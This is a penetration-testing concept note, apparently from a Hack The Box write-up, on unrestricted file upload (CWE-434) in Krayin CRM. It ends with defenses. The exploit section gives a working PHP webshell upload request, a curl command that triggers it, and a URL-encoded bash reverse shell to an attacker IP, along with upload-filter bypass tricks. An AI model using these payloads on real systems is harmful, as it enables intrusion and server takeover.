---
type: concept
domain: pentest
tags: [web, file-upload, rce, cwe-434]
source: Nexus HTB machine — CVE-2026-38526
---

## What it is
An unrestricted file upload vulnerability occurs when a web application accepts file uploads without properly validating the file type, allowing an attacker to upload a malicious script (e.g. a PHP webshell) that the server then executes.

## How it works

1. The application exposes an upload endpoint (e.g. for profile pictures, document attachments, CMS media)
2. It fails to validate the uploaded file's extension and/or MIME type server-side
3. The uploaded file lands in a web-accessible directory
4. The attacker requests the uploaded file via HTTP, causing the server to execute it
5. The attacker now has RCE in the context of the web server user (typically `www-data`)

**Common bypasses when partial validation exists:**
- Change `Content-Type` header to `image/jpeg` while keeping `.php` extension
- Use double extensions: `shell.php.jpg` (if only last extension is checked)
- Null byte injection: `shell.php%00.jpg` (older PHP versions)
- Alternate PHP extensions: `.phtml`, `.php5`, `.phar`

## Example / commands

**CVE-2026-38526 — Krayin CRM v2.2.x:**
The `/admin/tinymce/upload` endpoint accepted any file type. Exploit:

```http
POST /admin/tinymce/upload HTTP/1.1
Host: billing.nexus.htb
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="_token"

<fresh_csrf_token>
------boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------boundary--
```

Response returns the shell URL:
```json
{"location": "http://billing.nexus.htb/storage/tinymce/abc123.php"}
```

Trigger RCE:
```bash
curl "http://billing.nexus.htb/storage/tinymce/abc123.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Reverse shell (URL-encoded — always encode special chars in the request line):
```
GET /storage/.../shell.php?cmd=bash%20-i%20%3E%26%20/dev/tcp/10.10.16.x/4444%200%3E%261
```

> **Note:** CSRF tokens in Laravel expire fast. Always capture a fresh request from the live browser immediately before replaying in Burp Repeater. A 419 response means the token is stale.

## Defense & detection

- **Server-side allowlist** — only accept explicitly permitted extensions (e.g. `.png`, `.jpg`, `.pdf`)
- **Re-encode/process uploaded images** — strip any embedded code by passing through an image library
- **Store uploads outside the webroot** — serve them through a controller, never expose the raw upload directory over HTTP
- **Content-Type should not be trusted** — validate the actual file magic bytes server-side
- **Disable PHP execution in upload directories** via `.htaccess` or nginx config

## Related
- [[Nexus htb machine]]
- [[Credential Reuse]]
- [[Path Traversal]]
